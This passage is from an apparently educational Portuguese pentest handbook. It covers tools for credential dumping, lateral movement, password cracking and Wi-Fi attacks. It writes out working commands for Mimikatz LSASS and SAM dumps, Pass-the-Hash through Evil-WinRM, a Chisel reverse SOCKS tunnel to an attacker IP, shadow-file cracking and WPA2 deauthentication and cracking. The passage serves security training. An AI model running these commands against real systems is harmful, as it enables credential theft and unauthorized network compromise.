- **Descrição Acadêmica/Técnica:** O Mimikatz, desenvolvido em C por Benjamin Delpy, é uma ferramenta de extração de credenciais que opera através da manipulação direta da memória de processos do sistema Windows, especificamente do processo *Local Security Authority Subsystem Service* (LSASS). Em baixo nível, a ferramenta requer privilégios administrativos para abrir um *handle* de acesso ao processo LSASS (via chamadas à API do Windows como OpenProcess e ReadProcessMemory) e realiza a leitura e descriptografia estrutural das regiões de memória onde o sistema operacional armazena, em cache, as credenciais de sessões ativas — incluindo hashes NTLM, tíquetes Kerberos (TGT/TGS) e, em condições específicas (WDigest habilitado), senhas reversivelmente cifradas. Sua funcionalidade mais crítica, o *Pass-the-Hash* e o *Pass-the-Ticket*, permite reutilizar essas credenciais extraídas para autenticação lateral sem jamais conhecer a senha em texto claro do usuário.  
- **Principais Funcionalidades:**  
  - Extração de credenciais em texto claro e hashes NTLM diretamente da memória do processo LSASS (*sekurlsa::logonpasswords*).  
  - Extração e manipulação de tíquetes Kerberos para ataques *Pass-the-Ticket* e forja de tíquetes (*Golden Ticket*/*Silver Ticket*).  
  - *Dump* do banco de dados SAM local e do banco NTDS.dit de um *Domain Controller*, incluindo o hash *krbtgt*.  
  - Bypass e desabilitação de mecanismos de proteção do sistema (ex: neutralização temporária do AMSI e do *Antivírus* em memória).  
  - Manipulação de tokens de acesso (*token impersonation*) para elevação e movimentação entre contextos de segurança.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização da ferramenta (requer execução em contexto administrativo local no Windows)

mimikatz.exe

 Dentro da console: elevação de privilégios para o nível de depuração necessário para acessar o LSASS

privilege::debug

 Extração de todas as credenciais em cache (senhas, hashes NTLM e tíquetes) da memória do LSASS

sekurlsa::logonpasswords

 Extração específica de tíquetes Kerberos armazenados na sessão atual

sekurlsa::tickets /export

 Dump completo do banco SAM local (hashes de contas locais)

lsadump::sam

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após escalar privilégios para administrador local em um servidor Windows através da exploração de um serviço mal configurado, o analista sabe que um administrador de domínio realizou login recentemente naquela máquina (via RDP para uma tarefa de manutenção) e busca capturar essas credenciais privilegiadas em cache para obter acesso ao *Domain Controller*.  
  - **Comandos Executados:**  
  **Bash**

privilege::debug

sekurlsa::logonpasswords

- **Resultado Esperado:** O Mimikatz listará todas as sessões de logon ativas na memória do LSASS, incluindo a sessão do administrador de domínio identificada, exibindo o nome de usuário, domínio e o hash NTLM correspondente (e, caso o WDigest esteja habilitado no sistema, a senha em texto claro). Com o hash NTLM extraído, o analista poderá autenticar-se diretamente no *Domain Controller* através de um ataque *Pass-the-Hash*, sem nunca ter conhecido a senha original.



## **6.3 BloodHound**

- **Descrição Acadêmica/Técnica:** O BloodHound é uma ferramenta de análise de grafos para ambientes *Active Directory* e Azure AD, composta por um coletor de dados (*Ingestor*, tradicionalmente o SharpHound) e uma interface de visualização baseada no banco de dados orientado a grafos Neo4j. Em baixo nível, o coletor enumera exaustivamente o domínio através de consultas LDAP e chamadas de API do Windows (ex: enumeração de sessões via NetSessionEnum, permissões de ACLs via consultas ao *Security Descriptor* de objetos), mapeando relações de confiança complexas — como pertencimento a grupos, permissões delegadas, sessões de logon ativas e privilégios de acesso remoto — que são normalmente invisíveis a uma análise manual. A plataforma então aplica a teoria dos grafos para calcular algoritmicamente o *caminho de menor resistência* (*shortest path*) entre um usuário de baixo privilégio comprometido e o objetivo final (tipicamente, o grupo *Domain Admins*), revelando cadeias de ataque não intencionais decorrentes do acúmulo orgânico de permissões ao longo do tempo.  
- **Principais Funcionalidades:**  
  - Coleta automatizada e massiva de dados de sessões, permissões (ACLs), grupos e relações de confiança via SharpHound.  
  - Visualização interativa em grafo de toda a estrutura de relacionamentos e privilégios do domínio Active Directory.  
  - Cálculo algorítmico do *caminho de ataque* mais curto entre qualquer nó comprometido e um objetivo de alto privilégio (ex: Domain Admins).  
  - Identificação de configurações abusáveis específicas (ex: *Kerberoasting*, delegação irrestrita, *DCSync rights*, ACLs de *GenericAll*).  
  - Suporte a consultas customizadas via linguagem Cypher (nativa do Neo4j) para investigações direcionadas e complexas.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização do banco de dados de grafos (pré-requisito para o BloodHound)

sudo neo4j start

 Inicialização da interface gráfica principal de análise

bloodhound

 Coleta de dados no domínio a partir de uma máquina Windows já comprometida (executando o SharpHound.exe)

SharpHound.exe c All

 Coleta remota de dados via Python (BloodHound.py), útil quando não há execução direta em um host Windows

bloodhound-python u usuario p senha d dominio.local ns IPdoDC c All

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** O analista comprometeu a conta de um usuário de domínio padrão, sem nenhum privilégio administrativo aparente, em uma rede corporativa com centenas de usuários e grupos aninhados. Ao invés de tentar exploração manual às cegas, o objetivo é identificar programaticamente se existe algum caminho de escalonamento (por mais indireto que seja) que leve a essa conta comprometida até o grupo Domain Admins.  
  - **Execução Prática:** O analista executa bloodhound-python u usuario.padrao p 'SenhaValida123' d alvo.local ns 10.0.1.5 c All para coletar os dados remotamente, e em seguida importa os arquivos JSON gerados na interface gráfica do BloodHound. Na aba de análise, seleciona o nó do usuário comprometido como nó inicial e o grupo DOMAIN ADMINS como nó final, executando a consulta pré-definida "Shortest Path to Domain Admins".  
  - **Resultado Esperado:** O BloodHound renderizará visualmente uma cadeia de nós conectados, revelando, por exemplo, que o usuário comprometido pertence a um grupo aninhado que possui permissão *GenericAll* sobre outro usuário, que por sua vez está habilitado para *Constrained Delegation* em um serviço com privilégios de administrador de domínio. Essa cadeia visual fornece o roteiro exato e técnico dos comandos necessários (ex: via Mimikatz ou Rubeus) para escalar privilégios até o comprometimento total do domínio.



# **7  Movimentação Lateral e Persistência.**

Com privilégios elevados estabelecidos em um ponto de apoio (*foothold*), esta fase concentra-se em expandir o alcance do comprometimento através de segmentos de rede internos inacessíveis diretamente, bem como em garantir mecanismos de acesso remoto duradouros. O foco técnico recai sobre o tunelamento de tráfego, o roteamento de ferramentas ofensivas através de hosts pivô e o estabelecimento de canais de acesso persistentes.

## **7.1 Chisel**

- **Descrição Acadêmica/Técnica:** O Chisel é uma ferramenta de tunelamento TCP/UDP rápida, desenvolvida em Go e compilada como um binário estático único (sem dependências externas), projetada para estabelecer túneis criptografados sobre HTTP/WebSocket entre um cliente e um servidor. Em baixo nível, a ferramenta opera em uma arquitetura cliente-servidor: uma instância atua como servidor (tipicamente na máquina do atacante, expondo uma porta de escuta), enquanto a outra atua como cliente (executada no *host* pivô comprometido), estabelecendo uma conexão *outbound* multiplexada sobre uma única sessão SSH encapsulada dentro de WebSocket. Essa característica é criticamente relevante em ambientes corporativos, pois o tráfego de tunelamento se assemelha a tráfego HTTP/HTTPS legítimo, contornando *firewalls* de saída (*egress filtering*) que tipicamente bloqueiam apenas portas não convencionais, ao mesmo tempo em que multiplexa múltiplos túneis lógicos (*forward* e *reverse*) sobre essa única conexão física.  
- **Principais Funcionalidades:**  
  - Tunelamento reverso (*reverse tunneling*) que permite acesso a serviços internos de uma rede segmentada a partir de uma máquina externa, mesmo sem IP público na máquina pivô.  
  - Tunelamento direto (*forward tunneling*) para redirecionamento de portas locais até um serviço remoto interno.  
  - Multiplexação de múltiplos túneis simultâneos sobre uma única conexão TCP, reduzindo a superfície de detecção.  
  - Encapsulamento de tráfego sobre HTTP/WebSocket, dificultando a distinção em relação a tráfego web legítimo por *firewalls* de aplicação.  
  - Suporte nativo a criação de um *SOCKS5 proxy* diretamente através do túnel estabelecido, viabilizando o roteamento de outras ferramentas.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização do servidor Chisel na máquina atacante (com suporte a criação de proxy SOCKS5 pelo cliente)

chisel server p portadeescuta -reverse

 Conexão do cliente (executado no host pivô comprometido) estabelecendo um proxy SOCKS5 reverso

chisel client IPatacante:portadeescuta R:socks

 Tunelamento direto (forward) de uma porta interna específica de um segundo host para a máquina atacante

chisel client IPatacante:portadeescuta portalocal:IPinterno:portaremota

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após comprometer um servidor *web* (10.0.5.10) que atua como ponte entre a DMZ e a rede interna corporativa (192.168.20.0/24), o analista precisa rotear o tráfego de ferramentas como Nmap e o próprio NetExec através dessa máquina pivô para varrer a rede interna, à qual não possui rota direta a partir de sua estação de ataque externa.  
  - **Comandos Executados:**  
  **Bash**

chisel server p 8000 -reverse

chisel client 203.0.113.50:8000 R:socks

- **Resultado Esperado:** Após a execução do cliente no *host* pivô, o servidor Chisel na máquina atacante abrirá localmente um *proxy* SOCKS5 (padrão: 127.0.0.1:1080). Configurando esse *proxy* no arquivo /etc/proxychains4.conf, o analista poderá rotear qualquer ferramenta de linha de comando através do túnel reverso estabelecido, alcançando efetivamente a sub-rede interna 192.168.20.0/24 como se estivesse fisicamente conectado a ela.



## **7.2 Proxychains**

- **Descrição Acadêmica/Técnica:** O Proxychains é um utilitário que força o redirecionamento (*hijacking*) das chamadas de rede de qualquer aplicação para uma cadeia de *proxies* configurados (SOCKS4, SOCKS5 ou HTTP), sem exigir que a aplicação alvo possua suporte nativo a *proxy*. Em baixo nível, a ferramenta opera através da técnica de *interceptação dinâmica de biblioteca* (*LDPRELOAD* em sistemas Linux), injetando sua própria biblioteca compartilhada (libproxychains) antes da execução do programa. Essa biblioteca sobrescreve (*hook*) as chamadas de sistema padrão de rede (como connect()), redirecionando de forma transparente todo o tráfego TCP originalmente destinado a um socket direto através da cadeia de *proxies* definida no arquivo de configuração, permitindo o uso irrestrito de ferramentas como Nmap ou NetExec através de túneis previamente estabelecidos (ex: via Chisel ou SSH).  
- **Principais Funcionalidades:**  
  - Redirecionamento transparente e forçado do tráfego de rede de qualquer binário através de um ou mais *proxies*, sem necessidade de suporte nativo da aplicação.  
  - Suporte ao encadeamento de múltiplos *proxies* em sequência (*proxy chaining*), aumentando o anonimato e a complexidade de rastreamento.  
  - Três modos operacionais de encadeamento: *dynamicchain* (ignora proxies mortos), *strictchain* (exige que todos estejam ativos, na ordem definida) e *randomchain*.  
  - Integração direta com *proxies* SOCKS5 gerados por outras ferramentas de tunelamento (Chisel, SSH D, Ligolo-ng).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Edição do arquivo de configuração para adicionar o proxy SOCKS5 estabelecido (ex: via túnel Chisel/SSH)

nano /etc/proxychains4.conf

 Adicionar ao final do arquivo: socks5 127.0.0.1 1080

 Execução de qualquer comando/ferramenta roteando seu tráfego através da cadeia de proxies configurada

proxychains comandoeargumentosdaferramenta

 Exemplo de varredura de portas roteada através do proxy, contra a rede interna alcançada via pivot

proxychains nmap sT Pn blocoIPinternoouCIDR

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Com o túnel SOCKS5 reverso já estabelecido via Chisel (do exemplo anterior), o analista precisa efetivamente utilizar o NetExec para validar as credenciais de domínio previamente comprometidas contra os servidores da sub-rede interna 192.168.20.0/24, tarefa impossível sem o redirecionamento forçado do tráfego dessas ferramentas através do túnel.  
  - **Comando Executado:**  
  **Bash**

proxychains nxc smb 192.168.20.0/24 u joao.silva p 'Senha@2024'

- **Resultado Esperado:** O Proxychains interceptará todas as chamadas de conexão TCP realizadas pelo NetExec, redirecionando-as através do *proxy* SOCKS5 estabelecido pelo Chisel na porta 1080 local. O terminal exibirá o *log* de cada conexão sendo roteada pela cadeia (S-chain), seguido dos resultados normais do NetExec, agora referentes a *hosts* da rede interna que, sem o tunelamento, seriam completamente inacessíveis pela máquina do analista.



## **7.3 Evil-WinRM**

- **Descrição Acadêmica/Técnica:** O Evil-WinRM é um cliente ofensivo em Ruby para o protocolo *Windows Remote Management* (WinRM), que implementa o padrão WS-Management sobre HTTP/HTTPS (portas 5985/5986) para estabelecer sessões de *shell* remota interativa e completa em sistemas Windows, análoga a uma sessão PowerShell legítima e nativa do sistema operacional alvo. Em baixo nível, a ferramenta autentica-se via NTLM ou Kerberos (com suporte nativo a *hashes* NTLM para *Pass-the-Hash*, eliminando a necessidade de senha em texto claro) e, uma vez estabelecida a sessão, opera como um cliente WinRM completo, permitindo não apenas a execução de comandos remotos, mas também a carga dinâmica de *scripts* e módulos PowerShell diretamente na memória do processo remoto (*in-memory loading*), evitando a gravação de artefatos maliciosos em disco e a consequente detecção por soluções de *antivírus* baseadas em assinatura de arquivo.  
- **Principais Funcionalidades:**  
  - Estabelecimento de sessão *shell* interativa completa via WinRM, com suporte a autoconclusão de comandos e histórico.  
  - Autenticação flexível via senha em texto claro, *hash* NTLM (*Pass-the-Hash*) ou certificados Kerberos.  
  - Carregamento de *scripts* e módulos PowerShell (.ps1) diretamente na memória da sessão remota, sem necessidade de transferência prévia para o disco do alvo.  
  - Upload e download nativo de arquivos entre a máquina atacante e o alvo através da própria sessão estabelecida.  
  - Execução de comandos com bypass implícito de políticas restritivas de execução de *scripts* do PowerShell local.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Conexão autenticada via senha em texto claro

evil-winrm i IPdoalvo u usuario p senha

 Conexão autenticada via hash NTLM (Pass-the-Hash), sem necessidade da senha em texto claro

evil-winrm i IPdoalvo u usuario H hashntlm

 Conexão especificando um diretório local para facilitar o upload/download de scripts e ferramentas

evil-winrm i IPdoalvo u usuario p senha s diretoriolocaldescripts

 Dentro da sessão: carregamento de um script PowerShell diretamente em memória

menu

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após extrair um *hash* NTLM de um administrador local através do NetExec (-sam) em um servidor Windows específico (10.0.5.40), o analista precisa estabelecer uma sessão interativa completa nesse *host* para realizar tarefas de pós-exploração mais elaboradas, como o carregamento em memória de um *script* PowerShell de enumeração adicional, sem jamais ter conhecido a senha original da conta.  
  - **Comandos Executados:**  
  **Bash**

evil-winrm i 10.0.5.40 u administrador H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c s /opt/scriptspowershell

menu

- **Resultado Esperado:** A ferramenta autenticará com sucesso via *Pass-the-Hash*, estabelecendo um *prompt* interativo (*Evil-WinRM* PS C:UsersadministradorDocuments) equivalente a uma sessão PowerShell nativa com privilégios administrativos completos. O comando menu carregará os *scripts* PowerShell presentes no diretório local mapeado (/opt/scriptspowershell) diretamente na memória da sessão remota, disponibilizando novas funções customizadas sem deixar qualquer arquivo gravado no disco do sistema comprometido.



# **8  Criptoanálise e Quebra de Senhas.**

Ao longo das fases anteriores, diversos artefatos criptográficos são coletados (hashes NTLM extraídos via Mimikatz, arquivos de captura de handshakes Wi-Fi, hashes de banco de dados extraídos via SQLmap). Esta seção concentra-se na conversão desses artefatos ilegíveis em credenciais em texto claro, através de ataques computacionais offline (sem interação com o serviço original) e online (contra um serviço ativo), bem como na geração e mutação inteligente de listas de palavras candidatas.

## **8.1 Hashcat**

- **Descrição Acadêmica/Técnica:** O Hashcat é o motor de quebra de senhas mais performático da indústria, desenvolvido em C e OpenCL/CUDA, arquitetado para explorar o paralelismo massivo de Unidades de Processamento Gráfico (GPUs) em vez de depender exclusivamente do processamento sequencial de CPUs. Em baixo nível, a ferramenta compila *kernels* de computação específicos para cada algoritmo de *hash* suportado (mais de 350 modos, identificados numericamente), distribuindo o cálculo de milhões a bilhões de tentativas de *hash* por segundo entre os múltiplos núcleos de processamento paralelo de uma GPU. O motor suporta múltiplos vetores de ataque simultâneos e mutuamente combináveis — força bruta pura (*Brute-Force*), dicionário direto (*Straight*), *combinator* (concatenação de duas listas) e, mais notavelmente, ataques baseados em regras (*Rule-Based*), onde uma sintaxe compacta de transformação (ex: capitalização, substituição de caracteres, adição de sufixos numéricos) é aplicada dinamicamente sobre cada palavra de uma *wordlist* de entrada, multiplicando exponencialmente o espaço de busca sem a necessidade de armazenar fisicamente essas variações.  
- **Principais Funcionalidades:**  
  - Aceleração massiva via GPU (OpenCL/CUDA), atingindo taxas de processamento ordens de magnitude superiores a implementações baseadas em CPU.  
  - Suporte a mais de 350 algoritmos de *hash* distintos (NTLM, MD5, SHA-family, bcrypt, Kerberos 5 TGS-REP, WPA/WPA2, entre outros).  
  - Múltiplos modos de ataque combináveis: *Straight* (dicionário), *Combinator*, *Brute-Force* (máscara) e *Rule-Based* (mutação dinâmica).  
  - Motor de regras (*rules engine*) para mutação programática de *wordlists* (ex: capitalização, leet speak, inserção de sufixos), sem necessidade de gerar arquivos intermediários.  
  - Suporte a retomada de sessões interrompidas (*session/restore*) e *benchmarking* nativo de desempenho por algoritmo.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Ataque de dicionário simples especificando o modo do algoritmo de hash (ex: 1000  NTLM)

hashcat m modohash a 0 arquivohashes.txt wordlist.txt

 Ataque de dicionário combinado com um arquivo de regras de mutação (ex: best64.rule)

hashcat m modohash a 0 arquivohashes.txt wordlist.txt r regras.rule

 Ataque de força bruta baseado em máscara (ex: 8 caracteres, iniciando com letra maiúscula e terminando em 2 dígitos)

hashcat m modohash a 3 arquivohashes.txt ?u?l?l?l?l?l?d?d

 Exibição das senhas já quebradas em execuções anteriores, referenciando o arquivo de hashes original

hashcat m modohash arquivohashes.txt -show

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após extrair o hash NTLM de um usuário de domínio (via Mimikatz) que não pôde ser explorado diretamente por *Pass-the-Hash* devido a restrições de *Protected Users*, o analista precisa recuperar a senha em texto claro. A política de senhas da organização exige complexidade mínima, mas os colaboradores tendem a seguir padrões previsíveis (palavra capitalizada  ano).  
  - **Comando Executado:**  
  **Bash**

hashcat m 1000 hashntlmextraido.txt /usr/share/wordlists/rockyou.txt r /usr/share/hashcat/rules/best64.rule

- **Resultado Esperado:** O Hashcat carregará a GPU disponível, aplicando cada uma das 64 regras de mutação do arquivo best64.rule sobre cada palavra da *wordlist* rockyou.txt, testando variações como "Empresa2024" ou "empresa2024". Ao encontrar a correspondência exata com o hash NTLM fornecido, a senha em texto claro será exibida diretamente no terminal e persistida no arquivo de *potfile* padrão da ferramenta para consulta futura via -show.



## **8.2 John the Ripper**

- **Descrição Acadêmica/Técnica:** O John the Ripper (JtR) é um dos motores de quebra de senhas mais tradicionais e versáteis da indústria, desenvolvido em C, historicamente otimizado para processamento em CPU (embora sua variante *jumbo* também ofereça suporte experimental a OpenCL). Sua distinção arquitetural central reside no utilitário auxiliar *format-agnostic*, capaz de identificar automaticamente o algoritmo de um *hash* através de análise estrutural (comprimento, *salt*, delimitadores), e no script auxiliar *2john*, uma família de conversores que extrai hashes de formatos de arquivo proprietários e complexos (ex: documentos protegidos do Office, arquivos ZIP/RAR criptografados, chaves privadas SSH) para o formato de texto simples que o motor de quebra consegue processar. O modo de ataque "Single Crack" é particularmente notável por sua inteligência contextual, utilizando os próprios metadados da conta (nome de usuário, campos GECOS) como base para gerar candidatos de senha altamente direcionados antes de recorrer a *wordlists* genéricas.  
- **Principais Funcionalidades:**  
  - Identificação automática do formato/algoritmo de *hash* sem necessidade de especificação manual prévia na maioria dos casos.  
  - Suporte extensivo a conversores *2john* para extração de hashes de arquivos protegidos (Office, PDF, ZIP, RAR, chaves SSH privadas).  
  - Modo *Single Crack*, que gera candidatos de senha personalizados a partir dos metadados da própria conta do usuário.  
  - Modo incremental (*Incremental Mode*), realizando força bruta estatisticamente ordenada por frequência de caracteres do idioma.  
  - Suporte nativo a arquivos de senha no formato Unix *shadow* combinado com *passwd* (unshadow).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Conversão de um arquivo protegido (ex: chave privada SSH) para um formato de hash reconhecido pelo John

ssh2john chaveprivadaidrsa  hashextraido.txt

 Combinação dos arquivos passwd e shadow do Linux em um único arquivo processável

unshadow arquivopasswd arquivoshadow  hashescombinados.txt

 Ataque de quebra utilizando o modo Single Crack (baseado nos metadados da própria conta)

john -single arquivodehashes.txt

 Ataque de dicionário padrão especificando a wordlist a ser utilizada

john -wordlist=wordlist.txt arquivodehashes.txt

 Exibição das senhas já recuperadas em execuções anteriores

john -show arquivodehashes.txt

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante a fase de pós-exploração em um servidor Linux, o analista obtém acesso de leitura aos arquivos /etc/passwd e /etc/shadow (via uma falha de permissão local). O objetivo é recuperar a senha em texto claro do usuário root ou de outra conta privilegiada armazenada nesses arquivos, para uso posterior em outros serviços da rede (dado o comum reaproveitamento de senhas).  
  - **Comandos Executados:**  
  **Bash**

unshadow passwd.txt shadow.txt  hashesservidor.txt

john -wordlist=/usr/share/wordlists/rockyou.txt hashesservidor.txt

- **Resultado Esperado:** O John identificará automaticamente o algoritmo de *hash* (ex: SHA-512 *crypt*, indicado pelo prefixo $6$ no arquivo *shadow*) e testará cada entrada da *wordlist* rockyou.txt contra os hashes combinados. Ao concluir, o comando john -show hashesservidor.txt exibirá diretamente no terminal a lista de contas cujas senhas foram recuperadas com sucesso, no formato usuario:senhaemtextoclaro.



## **8.3 Crunch**

- **Descrição Acadêmica/Técnica:** O Crunch é um gerador de *wordlists* customizadas escrito em C, projetado para produzir combinações sistemáticas e exaustivas de caracteres de acordo com parâmetros rígidos definidos pelo operador (comprimento mínimo/máximo, conjunto de caracteres, padrões estruturais fixos). Diferente de *wordlists* estáticas pré-compiladas (como a rockyou.txt), que representam senhas reais previamente vazadas, o Crunch opera de forma puramente combinatória e determinística, iterando metodicamente por todo o espaço amostral definido pelos parâmetros de entrada. Sua funcionalidade de padrões (-t) é particularmente relevante para engenharia social direcionada, permitindo fixar segmentos conhecidos ou inferidos da senha (ex: o nome da empresa) e permutar apenas as posições variáveis remanescentes (ex: dígitos de ano ou caracteres especiais), reduzindo drasticamente o espaço de busca em relação a uma força bruta genérica e irrestrita.  
- **Principais Funcionalidades:**  
  - Geração combinatória e exaustiva de *wordlists* com controle granular de comprimento mínimo e máximo.  
  - Definição de conjuntos de caracteres customizados (numérico, alfabético, especial ou combinações arbitrárias).  
  - Suporte a padrões estruturais fixos (-t) para geração direcionada, mantendo segmentos conhecidos constantes.  
  - Estimativa precisa do tamanho final do arquivo de saída e do número total de combinações antes da geração efetiva.  
  - Capacidade de saída direta para arquivo ou encadeamento via *pipe* (saída padrão) diretamente para outra ferramenta (ex: Hashcat/Aircrack-ng).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Geração de uma wordlist numérica pura (ex: todos os PINs de 4 dígitos), redirecionada para um arquivo

crunch 4 4 0123456789 o pins4digitos.txt

 Geração baseada em um padrão fixo, combinando um prefixo conhecido com sufixo numérico variável (@  minúscula, %  número)

crunch 8 8 t Empresa%%%% o wordlistdirecionada.txt

 Geração com conjunto de caracteres customizado (letras minúsculas e dígitos), com saída direta via pipe para o Hashcat

crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 | hashcat m modohash arquivohashes.txt

 Estimativa do tamanho e quantidade de linhas resultantes sem gerar o arquivo completo

crunch 8 8 t Empresa%%%% -stats

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Através de engenharia social e OSINT prévio, o analista descobriu que a política de senha da rede Wi-Fi corporativa da empresa "TechCorp" segue rigorosamente o padrão nomedaempresa seguido de 4 dígitos numéricos (ex: TechCorp2024). O objetivo é gerar uma *wordlist* extremamente direcionada e compacta (em vez de uma genérica massiva) para uso subsequente em um ataque de quebra do *handshake* WPA2 capturado via Aircrack-ng.  
  - **Comando Executado:**  
  **Bash**

crunch 10 10 t TechCorp%%%% o wordlisttechcorpwifi.txt

- **Resultado Esperado:** O Crunch gerará instantaneamente um arquivo compacto contendo exatas 10.000 combinações (de TechCorp0000 a TechCorp9999), fixando o prefixo "TechCorp" e permutando exclusivamente os 4 últimos dígitos numéricos. Esse arquivo, drasticamente menor e mais direcionado que uma *wordlist* genérica de milhões de entradas, será utilizado como entrada direta para o Aircrack-ng, aumentando exponencialmente a velocidade e a probabilidade de sucesso da quebra da senha Wi-Fi.



# **9  Auditoria de Redes Sem Fio (Wireless/RF).**

Esta seção desvia-se do paradigma de redes cabeadas (TCP/IP) para operar diretamente na Camada 1 e 2 do modelo OSI, através da manipulação de interfaces de rádio frequência. O foco recai sobre a interceptação passiva de tráfego eletromagnético, a exploração de falhas criptográficas e de implementação nos protocolos de segurança Wi-Fi (WEP/WPA/WPA2/WPS) e a auditoria de outros meios de comunicação sem fio, como Bluetooth.

## **9.1 Aircrack-ng**

- **Descrição Acadêmica/Técnica:** O Aircrack-ng não é uma ferramenta isolada, mas uma suíte completa de utilitários em C, especializada na auditoria de segurança de redes Wi-Fi (802.11), cuja operação fundamental depende da capacidade da placa de rede sem fio de operar em *modo monitor* — um estado de baixo nível no qual a interface captura todos os quadros (*frames*) 802.11 no ar dentro do seu alcance de rádio, incluindo aqueles não destinados ao próprio dispositivo, ao contrário do *modo managed* convencional. Composta por ferramentas especializadas e encadeadas (airmon-ng para gerência de interfaces, airodump-ng para captura e despejo de pacotes, aireplay-ng para injeção de pacotes forjados, e aircrack-ng propriamente, o motor de quebra criptográfica), a suíte implementa ataques estatísticos contra a cifra RC4 do WEP e a captura determinística do *4-way handshake* do WPA/WPA2, cuja quebra subsequente depende da derivação criptográfica PBKDF2 contra uma *wordlist*.  
- **Principais Funcionalidades:**  
  - Gerenciamento de interfaces de rede sem fio, alternando entre modo gerenciado (*managed*) e modo monitor (*monitor mode*).  
  - Captura passiva de tráfego 802.11 e despejo estruturado em arquivos *.cap*, incluindo *beacons*, *probes* e *handshakes*.  
  - Injeção ativa de pacotes forjados, incluindo o envio de *deauthentication frames* para forçar a reconexão de clientes (e a consequente captura do *handshake*).  
  - Quebra criptográfica offline de chaves WEP (via exploração estatística de vetores de inicialização fracos) e de senhas WPA/WPA2-PSK (via ataque de dicionário contra o *handshake* capturado).  
  - Suporte a ataques específicos contra o protocolo WPS (*Wi-Fi Protected Setup*) através de força bruta do PIN.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Ativação do modo monitor na interface sem fio, encerrando processos conflitantes previamente

sudo airmon-ng check kill

sudo airmon-ng start interfacesemfio

 Varredura e captura de tráfego de todas as redes próximas visíveis no alcance de rádio

sudo airodump-ng interfaceemmodomonitor

 Captura direcionada a uma rede específica (BSSID e canal), salvando os pacotes em arquivo

sudo airodump-ng bssid MACdoroteador channel canal w arquivocaptura interfaceemmodomonitor

 Injeção de pacotes de desautenticação para forçar a reconexão de um cliente (e captura do handshake)

sudo aireplay-ng deauth numerodepacotes a MACdoroteador c MACdocliente interfaceemmodomonitor

 Quebra offline da senha WPA/WPA2 a partir do handshake capturado, utilizando uma wordlist

aircrack-ng arquivocaptura.cap w wordlist.txt

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em uma auditoria de segurança física autorizada, o analista precisa validar a robustez da senha da rede Wi-Fi corporativa protegida por WPA2-PSK ("RedeCorp5G"), capturando o *handshake* de autenticação de um dispositivo cliente já conectado e submetendo-o a um ataque de dicionário direcionado (gerado previamente via Crunch, conforme seção anterior).  
  - **Comandos Executados:**  
  **Bash**

sudo airmon-ng start wlan0

sudo airodump-ng bssid AA:BB:CC:DD:EE:FF channel 6 w capturacorp wlan0mon

sudo aireplay-ng deauth 10 a AA:BB:CC:DD:EE:FF c 11:22:33:44:55:66 wlan0mon

aircrack-ng capturacorp-01.cap w wordlisttechcorpwifi.txt

- **Resultado Esperado:** A desautenticação forçará o cliente a se reconectar automaticamente, momento em que o airodump-ng capturará com sucesso o *4-way handshake* (indicado no cabeçalho superior da tela de captura). O aircrack-ng então testará cada senha candidata da *wordlist* contra o *handshake*, derivando a chave PMK correspondente. Ao encontrar a correspondência, exibirá a mensagem "KEY FOUND" seguida da senha em texto claro da rede Wi-Fi.



## **9.2 Wifite**

- **Descrição Acadêmica/Técnica:** O Wifite é uma ferramenta de automação escrita em Python, projetada para orquestrar o fluxo completo de ataques contra redes sem fio ao encapsular e sequenciar a execução de múltiplas ferramentas subjacentes especializadas (Aircrack-ng, Reaver, Hashcat, entre outras) sob uma única interface de linha de comando simplificada. Em baixo nível, a ferramenta automatiza integralmente o ciclo operacional que seria manual no Aircrack-ng: ativação do modo monitor, varredura e listagem de todos os alvos próximos ordenados por força de sinal (RSSI), seleção heurística automática do vetor de ataque mais eficiente disponível para cada rede específica (WPS, captura de *handshake* WPA ou quebra de chave WEP), execução do ataque de desautenticação e, por fim, o encaminhamento automático do artefato capturado para o motor de quebra apropriado.  
- **Principais Funcionalidades:**  
  - Automação integral do ciclo de ataque contra redes sem fio, minimizando a intervenção manual do operador.  
  - Priorização e seleção automática de alvos com base na força do sinal (RSSI) e no vetor de ataque mais provável de sucesso.  
  - Ataques automatizados contra o protocolo WPS (Pixie-Dust e força bruta de PIN via Reaver/Bully).  
  - Captura automatizada de *handshakes* WPA/WPA2 com envio configurável de pacotes de desautenticação.  
  - Organização automática e estruturada dos artefatos capturados (handshakes, PINs, senhas) em diretório de sessão dedicado.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Execução padrão, iniciando a varredura interativa de todas as redes próximas disponíveis

sudo wifite

 Execução direcionada a um alvo específico pelo BSSID, ignorando o menu de seleção interativo

sudo wifite -bssid MACdoroteador

 Execução restringindo o escopo exclusivamente a ataques contra o protocolo WPS

sudo wifite -wps

 Execução em modo não interativo, atacando automaticamente todos os alvos elegíveis sem confirmação manual

sudo wifite -all -kill

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante uma avaliação de segurança física em um perímetro corporativo com múltiplos pontos de acesso Wi-Fi visíveis (redes corporativas, redes de convidados e possíveis roteadores de IoT mal configurados), o analista precisa de uma abordagem rápida e automatizada para identificar qual das redes disponíveis representa o vetor de ataque mais fácil, sem gastar tempo analisando manualmente cada uma.  
  - **Execução Prática:** O analista executa sudo wifite, aguardando a listagem de todas as redes detectadas ordenadas por intensidade de sinal. Identificando visualmente que uma das redes ("IoTCameraSetup") possui o protocolo WPS habilitado (indicador de alta probabilidade de sucesso), seleciona-a diretamente pelo número correspondente no menu interativo.  
